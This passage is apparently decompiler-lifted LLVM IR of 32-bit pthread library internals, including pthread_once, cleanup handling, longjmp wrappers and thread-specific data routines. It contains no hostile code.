; uselistorder directives
  uselistorder i32 %v1_805a03f, { 1, 0, 2 }
  uselistorder i32 %v1_805a016, { 1, 0, 2 }
  uselistorder i32 %v1_8059fec, { 1, 0 }
  uselistorder i32 %v3_8059fe9, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_8059fe1, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_alt_lock, { 1, 2, 0 }
  uselistorder i32 (i32)* @thread_self.18, { 2, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805a073, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805a06e, { 1, 0 }
  uselistorder label %dec_label_pc_805a025, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a003, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare() local_unnamed_addr {
entry:
  %v1_805a07f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  ret i32 %v1_805a07f
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_805a088 = load i32, i32* @esi, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v2_805a091 = load i32, i32* %arg1, align 4
  %v11_805a091 = icmp eq i32 %v2_805a091, 2
  %v1_805a094 = icmp eq i1 %v11_805a091, false
  br i1 %v1_805a094, label %dec_label_pc_805a09b, label %dec_label_pc_805a162

dec_label_pc_805a09b:                             ; preds = %entry
  %v1_805a0a3 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  %v0_805a0a8 = load i32, i32* @esi, align 4
  %v1_805a0a8 = inttoptr i32 %v0_805a0a8 to i32*
  %v2_805a0a8 = load i32, i32* %v1_805a0a8, align 4
  %v1_805a0af = urem i32 %v2_805a0a8, 4
  %v8_805a0b2 = icmp eq i32 %v1_805a0af, 1
  %v1_805a0b3 = icmp eq i1 %v8_805a0b2, false
  br i1 %v1_805a0b3, label %dec_label_pc_805a0dc.preheader, label %dec_label_pc_805a0b5

dec_label_pc_805a0b5:                             ; preds = %dec_label_pc_805a09b
  %v1_805a0b5 = and i32 %v2_805a0a8, -4
  %v1_805a0b8 = load i32, i32* @global_var_8078eac.678, align 4
  %v12_805a0b8 = icmp eq i32 %v1_805a0b5, %v1_805a0b8
  br i1 %v12_805a0b8, label %dec_label_pc_805a0dc.preheader, label %dec_label_pc_805a0c0

dec_label_pc_805a0c0:                             ; preds = %dec_label_pc_805a0b5
  store i32 0, i32* %v1_805a0a8, align 4
  %v0_805a0dc14.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a0dc.preheader

dec_label_pc_805a0dc.preheader:                   ; preds = %dec_label_pc_805a0c0, %dec_label_pc_805a09b, %dec_label_pc_805a0b5
  %v0_805a0dc14 = phi i32 [ %v0_805a0dc14.pre, %dec_label_pc_805a0c0 ], [ %v0_805a0a8, %dec_label_pc_805a09b ], [ %v0_805a0a8, %dec_label_pc_805a0b5 ]
  %v1_805a0dc15 = inttoptr i32 %v0_805a0dc14 to i32*
  %v2_805a0dc16 = load i32, i32* %v1_805a0dc15, align 4
  %v1_805a0e017 = urem i32 %v2_805a0dc16, 4
  %v8_805a0e319 = icmp eq i32 %v1_805a0e017, 1
  br i1 %v8_805a0e319, label %dec_label_pc_805a0c8, label %dec_label_pc_805a0e6

dec_label_pc_805a0c8:                             ; preds = %dec_label_pc_805a0dc.preheader, %dec_label_pc_805a0c8
  %v0_805a0c8 = load i32, i32* @ecx, align 4
  %v4_805a0d4 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_8078ea0.677 to i32), i32 ptrtoint (i32* @global_var_8078e88.676 to i32), i32 %v0_805a0c8, i32 %v0_805a0c8)
  %v0_805a0dc = load i32, i32* @esi, align 4
  %v1_805a0dc = inttoptr i32 %v0_805a0dc to i32*
  %v2_805a0dc = load i32, i32* %v1_805a0dc, align 4
  %v1_805a0e0 = urem i32 %v2_805a0dc, 4
  %v8_805a0e3 = icmp eq i32 %v1_805a0e0, 1
  br i1 %v8_805a0e3, label %dec_label_pc_805a0c8, label %dec_label_pc_805a0e6

dec_label_pc_805a0e6:                             ; preds = %dec_label_pc_805a0c8, %dec_label_pc_805a0dc.preheader
  %v1_805a0dc.lcssa = phi i32* [ %v1_805a0dc15, %dec_label_pc_805a0dc.preheader ], [ %v1_805a0dc, %dec_label_pc_805a0c8 ]
  %v2_805a0dc.lcssa = phi i32 [ %v2_805a0dc16, %dec_label_pc_805a0dc.preheader ], [ %v2_805a0dc, %dec_label_pc_805a0c8 ]
  store i32 0, i32* @ebx, align 4
  %v1_805a0e8 = icmp eq i32 %v2_805a0dc.lcssa, 0
  %v1_805a0ea = icmp eq i1 %v1_805a0e8, false
  br i1 %v1_805a0ea, label %dec_label_pc_805a0e6.dec_label_pc_805a13e_crit_edge, label %dec_label_pc_805a0ec

dec_label_pc_805a0e6.dec_label_pc_805a13e_crit_edge: ; preds = %dec_label_pc_805a0e6
  br label %dec_label_pc_805a13e

dec_label_pc_805a0ec:                             ; preds = %dec_label_pc_805a0e6
  %v0_805a0ef = load i32, i32* @global_var_8078eac.678, align 4
  %v1_805a0f4 = or i32 %v0_805a0ef, 1
  store i32 %v1_805a0f4, i32* %v1_805a0dc.lcssa, align 4
  %v1_805a0fe = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  %v0_805a106 = load i32, i32* @esi, align 4
  %v2_805a10c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805a10c, i32* @ebx, align 4
  %v4_805a111 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-24, i32 134586730, i32 %v0_805a106)
  call void @__pseudo_call(i32 %tmp3)
  %v3_805a11f = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-24, i32 0)
  %v1_805a12b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  store i32 1, i32* @ebx, align 4
  %v0_805a135 = load i32, i32* @esi, align 4
  %v1_805a135 = inttoptr i32 %v0_805a135 to i32*
  store i32 2, i32* %v1_805a135, align 4
  br label %dec_label_pc_805a13e

dec_label_pc_805a13e:                             ; preds = %dec_label_pc_805a0e6.dec_label_pc_805a13e_crit_edge, %dec_label_pc_805a0ec
  %v1_805a146 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  %v0_805a14e = load i32, i32* @ebx, align 4
  %v1_805a14e = icmp eq i32 %v0_805a14e, 0
  br i1 %v1_805a14e, label %dec_label_pc_805a162, label %dec_label_pc_805a152

dec_label_pc_805a152:                             ; preds = %dec_label_pc_805a13e
  %v1_805a15a = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_8078ea0.677 to i32))
  br label %dec_label_pc_805a162

dec_label_pc_805a162:                             ; preds = %entry, %dec_label_pc_805a13e, %dec_label_pc_805a152
  store i32 %v0_805a088, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805a0dc, { 1, 0 }
  uselistorder i32 %v2_805a0dc16, { 1, 0 }
  uselistorder i32 %v2_805a0a8, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* @global_var_8078eac.678, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805a162, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a13e, { 1, 0 }
  uselistorder label %dec_label_pc_805a0c8, { 1, 0 }
  uselistorder label %dec_label_pc_805a0dc.preheader, { 0, 2, 1 }
}

define i32 @pthread_once_cancelhandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805a16a = load i32, i32* @ebx, align 4
  store i32 %v0_805a16a, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a177 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  %v0_805a17c = load i32, i32* @ebx, align 4
  %v1_805a17c = inttoptr i32 %v0_805a17c to i32*
  store i32 0, i32* %v1_805a17c, align 4
  %v1_805a189 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  %v2_805a199 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a199, i32* @ebx, align 4
  %v1_805a19a = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_8078ea0.677 to i32))
  ret i32 %v1_805a19a

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_8078ea0.677, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8078ea0.677 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8078e88.676 to i32), { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9 }
}

define i32 @pthread_cleanup_upto(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-480 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805a1a3 = load i32, i32* @ebx, align 4
  store i32 %v0_805a1a3, i32* %stack_var_-16, align 4
  %v4_805a1a3 = ptrtoint i32* %stack_var_-16 to i32
  %v0_805a1a7 = load i32, i32* @eax, align 4
  store i32 %v0_805a1a7, i32* %edi.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074160 to i32), i32* %esi.global-to-local, align 4
  %v1_805a1b2 = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_805a1b2 = icmp ult i32 %v4_805a1a3, %v1_805a1b2
  %v1_805a1b8 = icmp eq i1 %v7_805a1b2, false
  br i1 %v1_805a1b8, label %dec_label_pc_805a1f0, label %dec_label_pc_805a1ba

dec_label_pc_805a1ba:                             ; preds = %entry
  %v1_805a1ba = load i32, i32* @global_var_8078e70.616, align 16
  %v7_805a1ba = icmp ult i32 %v4_805a1a3, %v1_805a1ba
  br i1 %v7_805a1ba, label %dec_label_pc_805a1cf, label %dec_label_pc_805a1c2

dec_label_pc_805a1c2:                             ; preds = %dec_label_pc_805a1ba
  store i32 ptrtoint (i32* @global_var_8074340.617 to i32), i32* %esi.global-to-local, align 4
  %v1_805a1c7 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_805a1c7 = icmp ult i32 %v4_805a1a3, %v1_805a1c7
  br i1 %v7_805a1c7, label %dec_label_pc_805a1f0, label %dec_label_pc_805a1cf

dec_label_pc_805a1cf:                             ; preds = %dec_label_pc_805a1c2, %dec_label_pc_805a1ba
  %v0_805a1cf = load i32, i32* @global_var_807e578.619, align 8
  %v1_805a1cf = icmp eq i32 %v0_805a1cf, 0
  br i1 %v1_805a1cf, label %dec_label_pc_805a1e5, label %dec_label_pc_805a1d8

dec_label_pc_805a1d8:                             ; preds = %dec_label_pc_805a1cf
  %v0_805a1d8 = call i32 @__pthread_find_self()
  store i32 %v0_805a1d8, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a1f0

dec_label_pc_805a1e1:                             ; preds = %dec_label_pc_805a1f9
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a214

dec_label_pc_805a1e5:                             ; preds = %dec_label_pc_805a1cf
  %v2_805a1ea = ptrtoint i32* %stack_var_-480 to i32
  store i32 %v2_805a1ea, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a1f0

dec_label_pc_805a1f0:                             ; preds = %dec_label_pc_805a1c2, %entry, %dec_label_pc_805a1d8, %dec_label_pc_805a1e5
  %v0_805a1f4 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_805a1c2 ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v0_805a1d8, %dec_label_pc_805a1d8 ], [ %v2_805a1ea, %dec_label_pc_805a1e5 ]
  store i32 %v4_805a1a3, i32* %ebp.global-to-local, align 4
  %v1_805a1f4 = add i32 %v0_805a1f4, 60
  %v2_805a1f4 = inttoptr i32 %v1_805a1f4 to i32*
  %v3_805a1f4 = load i32, i32* %v2_805a1f4, align 4
  store i32 %v3_805a1f4, i32* %ebx.global-to-local, align 4
  %v1_805a20b2 = icmp eq i32 %v3_805a1f4, 0
  br i1 %v1_805a20b2, label %dec_label_pc_805a214, label %dec_label_pc_805a20f.lr.ph

dec_label_pc_805a20f.lr.ph:                       ; preds = %dec_label_pc_805a1f0
  br label %dec_label_pc_805a20f

dec_label_pc_805a1f9:                             ; preds = %dec_label_pc_805a20f
  %v1_805a1f9 = load i32, i32* %ebp.global-to-local, align 4
  %tmp = icmp ugt i32 %v4_805a203, %v1_805a1f9
  br i1 %tmp, label %dec_label_pc_805a1fd, label %dec_label_pc_805a1e1

dec_label_pc_805a1fd:                             ; preds = %dec_label_pc_805a1f9
  %v5_805a203 = inttoptr i32 %v4_805a203 to i32*
  %v6_805a203 = load i32, i32* %v5_805a203, align 4
  call void @__pseudo_call(i32 %v6_805a203)
  %v0_805a205 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a205 = add i32 %v0_805a205, 12
  %v2_805a205 = inttoptr i32 %v1_805a205 to i32*
  %v3_805a205 = load i32, i32* %v2_805a205, align 4
  store i32 %v3_805a205, i32* %ebx.global-to-local, align 4
  %v1_805a20b = icmp eq i32 %v3_805a205, 0
  br i1 %v1_805a20b, label %dec_label_pc_805a214, label %dec_label_pc_805a20f

dec_label_pc_805a20f:                             ; preds = %dec_label_pc_805a20f.lr.ph, %dec_label_pc_805a1fd
  %v4_805a203 = phi i32 [ %v3_805a1f4, %dec_label_pc_805a20f.lr.ph ], [ %v3_805a205, %dec_label_pc_805a1fd ]
  %v1_805a20f = load i32, i32* %edi.global-to-local, align 4
  %v2_805a20f = add i32 %v1_805a20f, 16
  %v3_805a20f = inttoptr i32 %v2_805a20f to i32*
  %v4_805a20f = load i32, i32* %v3_805a20f, align 4
  %v10_805a20f = icmp ult i32 %v4_805a203, %v4_805a20f
  br i1 %v10_805a20f, label %dec_label_pc_805a1f9, label %dec_label_pc_805a214

dec_label_pc_805a214:                             ; preds = %dec_label_pc_805a1fd, %dec_label_pc_805a20f, %dec_label_pc_805a1f0, %dec_label_pc_805a1e1
  %v0_805a217 = phi i32 [ 0, %dec_label_pc_805a1e1 ], [ 0, %dec_label_pc_805a1f0 ], [ %v4_805a203, %dec_label_pc_805a20f ], [ 0, %dec_label_pc_805a1fd ]
  %v0_805a214 = load i32, i32* %esi.global-to-local, align 4
  %v1_805a214 = add i32 %v0_805a214, 84
  %v2_805a214 = inttoptr i32 %v1_805a214 to i32*
  %v3_805a214 = load i32, i32* %v2_805a214, align 4
  %v2_805a217 = add i32 %v0_805a214, 60
  %v3_805a217 = inttoptr i32 %v2_805a217 to i32*
  store i32 %v0_805a217, i32* %v3_805a217, align 4
  %v1_805a21a = icmp eq i32 %v3_805a214, 0
  br i1 %v1_805a21a, label %dec_label_pc_805a22a, label %dec_label_pc_805a21e

dec_label_pc_805a21e:                             ; preds = %dec_label_pc_805a214
  %v1_805a21e = load i32, i32* %edi.global-to-local, align 4
  %v2_805a21e = add i32 %v1_805a21e, 16
  %v3_805a21e = inttoptr i32 %v2_805a21e to i32*
  %v4_805a21e = load i32, i32* %v3_805a21e, align 4
  %v10_805a21e = icmp ult i32 %v3_805a214, %v4_805a21e
  %v1_805a221 = icmp eq i1 %v10_805a21e, false
  br i1 %v1_805a221, label %dec_label_pc_805a22a, label %dec_label_pc_805a223

dec_label_pc_805a223:                             ; preds = %dec_label_pc_805a21e
  %v0_805a223 = load i32, i32* %esi.global-to-local, align 4
  %v1_805a223 = add i32 %v0_805a223, 84
  %v2_805a223 = inttoptr i32 %v1_805a223 to i32*
  store i32 0, i32* %v2_805a223, align 4
  br label %dec_label_pc_805a22a

dec_label_pc_805a22a:                             ; preds = %dec_label_pc_805a21e, %dec_label_pc_805a214, %dec_label_pc_805a223
  %v2_805a22d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805a22d, i32* @ebx, align 4
  ret i32 %v3_805a214

; uselistorder directives
  uselistorder i32 %v3_805a214, { 2, 0, 1 }
  uselistorder i32 %v4_805a203, { 1, 3, 0, 2 }
  uselistorder i32 %v3_805a205, { 1, 0, 2 }
  uselistorder i32 %v4_805a1a3, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805a22a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a214, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805a20f, { 1, 0 }
  uselistorder label %dec_label_pc_805a1f0, { 3, 2, 0, 1 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805a232 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805a23c = call i32 @pthread_cleanup_upto(i32 %v0_805a232)
  %v0_805a247 = load i32, i32* @ebx, align 4
  %v4_805a248 = call i32 @_longjmp(i32 %v0_805a247, i32 %arg2, i32 %v1_805a23c, i32 %v1_805a23c)
  ret i32 %v4_805a248

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805a24d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805a257 = call i32 @pthread_cleanup_upto(i32 %v0_805a24d)
  %v0_805a25c = load i32, i32* @edx, align 4
  %v0_805a262 = load i32, i32* @ebx, align 4
  %v4_805a263 = call i32 @_longjmp(i32 %v0_805a262, i32 %arg2, i32 %v0_805a25c, i32 %v0_805a25c)
  ret i32 %v4_805a263

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 (i32)* @pthread_cleanup_upto, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @thread_self.19(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_805a26f = load i32, i32* @esp, align 4
  %v1_805a26f = load i32, i32* @global_var_8078e6c.615, align 4
  %v7_805a26f = icmp ult i32 %v0_805a26f, %v1_805a26f
  %v1_805a275 = icmp eq i1 %v7_805a26f, false
  br i1 %v1_805a275, label %dec_label_pc_805a2a6, label %dec_label_pc_805a277

dec_label_pc_805a277:                             ; preds = %entry
  %v1_805a277 = load i32, i32* @global_var_8078e70.616, align 16
  %v7_805a277 = icmp ult i32 %v0_805a26f, %v1_805a277
  br i1 %v7_805a277, label %dec_label_pc_805a28c, label %dec_label_pc_805a27f

dec_label_pc_805a27f:                             ; preds = %dec_label_pc_805a277
  %v1_805a284 = load i32, i32* @global_var_8078e74.618, align 4
  %v7_805a284 = icmp ult i32 %v0_805a26f, %v1_805a284
  br i1 %v7_805a284, label %dec_label_pc_805a2a6, label %dec_label_pc_805a28c

dec_label_pc_805a28c:                             ; preds = %dec_label_pc_805a27f, %dec_label_pc_805a277
  %v0_805a28c = load i32, i32* @global_var_807e578.619, align 8
  %v1_805a28c = icmp eq i32 %v0_805a28c, 0
  br i1 %v1_805a28c, label %dec_label_pc_805a29a, label %dec_label_pc_805a295

dec_label_pc_805a295:                             ; preds = %dec_label_pc_805a28c
  %v0_805a295 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805a29a

dec_label_pc_805a29a:                             ; preds = %dec_label_pc_805a28c, %dec_label_pc_805a295
  %v2_805a2a0 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805a2a6

dec_label_pc_805a2a6:                             ; preds = %dec_label_pc_805a27f, %entry, %dec_label_pc_805a29a
  %v0_805a2a6 = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_805a27f ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_805a2a0, %dec_label_pc_805a29a ]
  ret i32 %v0_805a2a6

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8074160 to i32), { 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_8074340.617 to i32), { 0, 1, 11, 2, 3, 4, 5, 12, 13, 6, 7, 8, 9, 10 }
  uselistorder i32 ()* @__pthread_find_self, { 6, 0, 2, 5, 8, 4, 7, 1, 10, 9, 3 }
  uselistorder label %dec_label_pc_805a2a6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a29a, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805a2aa = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_805a2b8 = mul i32 %arg1, 4
  %v3_805a2b8 = add i32 %v2_805a2b8, 364
  %v4_805a2b8 = add i32 %v3_805a2b8, %v1_805a2aa
  ret i32 %v4_805a2b8
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805a2c3 = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_805a2cc = mul i32 %arg1, 4
  %v3_805a2cc = add i32 %v2_805a2cc, 364
  %v4_805a2cc = add i32 %v3_805a2cc, %v1_805a2c3
  %v5_805a2cc = inttoptr i32 %v4_805a2cc to i32*
  %v6_805a2cc = load i32, i32* %v5_805a2cc, align 4
  ret i32 %v6_805a2cc
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805a2da = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v3_805a2e7 = mul i32 %arg1, 4
  %v4_805a2e7 = add i32 %v3_805a2e7, 364
  %v5_805a2e7 = add i32 %v4_805a2e7, %v1_805a2da
  %v6_805a2e7 = inttoptr i32 %v5_805a2e7 to i32*
  store i32 %arg2, i32* %v6_805a2e7, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 2, 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805a2f4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v6_805a302 = icmp ugt i32 %arg1, 1023
  br i1 %v6_805a302, label %dec_label_pc_805a32b, label %dec_label_pc_805a304

dec_label_pc_805a304:                             ; preds = %entry
  %v1_805a304 = call i32 @thread_self.19(i32 %v0_805a2f4)
  %v0_805a309 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805a30b = udiv i32 %v0_805a309, 32
  %v2_805a30e = mul nuw nsw i32 %v2_805a30b, 4
  %v3_805a30e = add i32 %v1_805a304, 236
  %v4_805a30e = add i32 %v3_805a30e, %v2_805a30e
  %v5_805a30e = inttoptr i32 %v4_805a30e to i32*
  %v6_805a30e = load i32, i32* %v5_805a30e, align 4
  %v1_805a315 = icmp eq i32 %v6_805a30e, 0
  br i1 %v1_805a315, label %dec_label_pc_805a32b, label %dec_label_pc_805a319

dec_label_pc_805a319:                             ; preds = %dec_label_pc_805a304
  %v1_805a319 = mul i32 %v0_805a309, 8
  %v2_805a319 = add i32 %v1_805a319, ptrtoint (i32* @global_var_8078ec0.680 to i32)
  %v3_805a319 = inttoptr i32 %v2_805a319 to i32*
  %v4_805a319 = load i32, i32* %v3_805a319, align 8
  %v5_805a319 = icmp eq i32 %v4_805a319, 0
  br i1 %v5_805a319, label %dec_label_pc_805a32b, label %dec_label_pc_805a323

dec_label_pc_805a323:                             ; preds = %dec_label_pc_805a319
  %v1_805a323 = urem i32 %v0_805a309, 32
  store i32 %v1_805a323, i32* %ebx.global-to-local, align 4
  %v2_805a326 = mul nuw nsw i32 %v1_805a323, 4
  %v3_805a326 = add i32 %v2_805a326, %v6_805a30e
  %v4_805a326 = inttoptr i32 %v3_805a326 to i32*
  %v5_805a326 = load i32, i32* %v4_805a326, align 4
  br label %dec_label_pc_805a32d

dec_label_pc_805a32b:                             ; preds = %dec_label_pc_805a319, %dec_label_pc_805a304, %entry
  br label %dec_label_pc_805a32d

dec_label_pc_805a32d:                             ; preds = %dec_label_pc_805a323, %dec_label_pc_805a32b
  %storemerge = phi i32 [ %v5_805a326, %dec_label_pc_805a323 ], [ 0, %dec_label_pc_805a32b ]
  store i32 %v0_805a2f4, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805a323, { 1, 0 }
  uselistorder i32 %v0_805a309, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805a32d, { 1, 0 }
}

define i32 @__pthread_destroy_specifics() local_unnamed_addr {
dec_label_pc_805a3aa.lr.ph:
  %v0_805a332 = load i32, i32* @edi, align 4
  %v0_805a333 = load i32, i32* @esi, align 4
  %v0_805a334 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805a33a = call i32 @thread_self.19(i32 %v0_805a334)
  store i32 %v1_805a33a, i32* @esi, align 4
  %v0_805a3aa.pre = load i32, i32* @ebp, align 4
  %v1_805a3aa = add i32 %v0_805a3aa.pre, -3
  %v6_805a3aa = sub i32 2, %v0_805a3aa.pre
  %v7_805a3aa = and i32 %v6_805a3aa, %v0_805a3aa.pre
  %v8_805a3aa = icmp slt i32 %v7_805a3aa, 0
  %v9_805a3aa = icmp eq i32 %v1_805a3aa, 0
  %v10_805a3aa = icmp slt i32 %v1_805a3aa, 0
  %v3_805a3ad = icmp eq i1 %v10_805a3aa, %v8_805a3aa
  %v4_805a3ad = icmp eq i1 %v9_805a3aa, false
  %v5_805a3ad = and i1 %v4_805a3ad, %v3_805a3ad
  br i1 %v5_805a3ad, label %dec_label_pc_805a3bb, label %dec_label_pc_805a3af

dec_label_pc_805a34b:                             ; preds = %dec_label_pc_805a39c.dec_label_pc_805a34b_crit_edge, %dec_label_pc_805a3af
  %v0_805a34d = phi i32 [ %v1_805a33a, %dec_label_pc_805a3af ], [ %v0_805a34d.pre, %dec_label_pc_805a39c.dec_label_pc_805a34b_crit_edge ]
  %v0_805a39c.pre31 = phi i32 [ 0, %dec_label_pc_805a3af ], [ %v1_805a39c, %dec_label_pc_805a39c.dec_label_pc_805a34b_crit_edge ]
  store i32 0, i32* @edi, align 4
  %v2_805a34d = mul i32 %v0_805a39c.pre31, 4
  %v3_805a34d = add i32 %v2_805a34d, 236
  %v4_805a34d = add i32 %v3_805a34d, %v0_805a34d
  %v5_805a34d = inttoptr i32 %v4_805a34d to i32*
  %v6_805a34d = load i32, i32* %v5_805a34d, align 4
  %v7_805a34d = icmp eq i32 %v6_805a34d, 0
  %v1_805a355 = icmp eq i1 %v7_805a34d, false
  br i1 %v1_805a355, label %dec_label_pc_805a397.preheader, label %dec_label_pc_805a39c

dec_label_pc_805a397.preheader:                   ; preds = %dec_label_pc_805a34b
  br label %dec_label_pc_805a359

dec_label_pc_805a359:                             ; preds = %dec_label_pc_805a396.dec_label_pc_805a359_crit_edge, %dec_label_pc_805a397.preheader
  %v1_805a36e = phi i32 [ %v0_805a34d, %dec_label_pc_805a397.preheader ], [ %v1_805a36e.pre, %dec_label_pc_805a396.dec_label_pc_805a359_crit_edge ]
  %v0_805a39c.pre33 = phi i32 [ %v0_805a39c.pre31, %dec_label_pc_805a397.preheader ], [ %v0_805a39c.pre, %dec_label_pc_805a396.dec_label_pc_805a359_crit_edge ]
  %v0_805a36732 = phi i32 [ 0, %dec_label_pc_805a397.preheader ], [ %v1_805a396, %dec_label_pc_805a396.dec_label_pc_805a359_crit_edge ]
  %v2_805a35b = mul i32 %v0_805a39c.pre33, 32
  %v2_805a35e = add i32 %v2_805a35b, %v0_805a36732
  %v1_805a360 = mul i32 %v2_805a35e, 8
  %v2_805a360 = add i32 %v1_805a360, ptrtoint (i32* @global_var_8078ec4.681 to i32)
  %v3_805a360 = inttoptr i32 %v2_805a360 to i32*
  %v4_805a360 = load i32, i32* %v3_805a360, align 4
  %v1_805a375 = icmp eq i32 %v4_805a360, 0
  br i1 %v1_805a375, label %dec_label_pc_805a396, label %dec_label_pc_805a37b

dec_label_pc_805a37b:                             ; preds = %dec_label_pc_805a359
  %v3_805a36e = mul i32 %v0_805a39c.pre33, 4
  %v4_805a36e = add i32 %v3_805a36e, 236
  %v5_805a36e = add i32 %v4_805a36e, %v1_805a36e
  %v6_805a36e = inttoptr i32 %v5_805a36e to i32*
  %v7_805a36e = load i32, i32* %v6_805a36e, align 4
  %v1_805a367 = mul i32 %v0_805a36732, 4
  %v8_805a36e = add i32 %v7_805a36e, %v1_805a367
  %v1_805a377 = inttoptr i32 %v8_805a36e to i32*
  store i32 0, i32* %v1_805a377, align 4
  call void @__pseudo_call(i32 %v4_805a360)
  %v0_805a396.pre = load i32, i32* @edi, align 4
  %v0_805a39c.pre.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a396

dec_label_pc_805a396:                             ; preds = %dec_label_pc_805a359, %dec_label_pc_805a37b
  %v0_805a39c.pre = phi i32 [ %v0_805a39c.pre33, %dec_label_pc_805a359 ], [ %v0_805a39c.pre.pre, %dec_label_pc_805a37b ]
